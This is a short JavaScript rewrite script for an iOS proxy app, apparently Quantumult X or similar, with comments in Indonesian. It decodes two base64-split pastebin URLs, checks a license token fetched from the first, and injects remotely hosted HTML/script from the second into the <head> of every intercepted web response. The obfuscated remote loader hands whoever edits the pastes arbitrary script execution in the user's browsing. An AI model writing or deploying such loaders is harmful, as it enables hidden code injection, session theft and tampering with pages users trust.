const MY_TOKEN = "malik_pepek"; 

// Link dipotong (Tetap Aman)
const _0xU1 = "aHR0cHM6"+"Ly9wYXN0ZWJpbi"+"5jb20vcmF3L0d"+"NMVIyZjh1";
const _0xU2 = "aHR0cHM6"+"Ly9wYXN0ZWJp"+"bi5jb20vcmF3L"+"2tSWFY3ZnNU";

// Request Token & Payload secara bersamaan (Parallel)
const req1 = { url: atob(_0xU1) + "?t=" + Date.now() };
const req2 = { url: atob(_0xU2) };

Promise.all([$task.fetch(req1), $task.fetch(req2)]).then(results => {
    const tokenData = results[0].body;
    const uiData = results[1].body;

    if (tokenData && tokenData.includes(MY_TOKEN) && uiData) {
        let b = $response.body;
        if (b) {
            // Langsung inject tanpa modifikasi header berat
            b = b.replace("<head>", "<head>" + uiData);
        }
        $done({ body: b });
    } else {
        if (tokenData && !tokenData.includes(MY_TOKEN)) {
            $notify("SECURITY", "OFFLINE", "Token Invalid");
        }
        $done({});
    }
}).catch(() => $done({}));
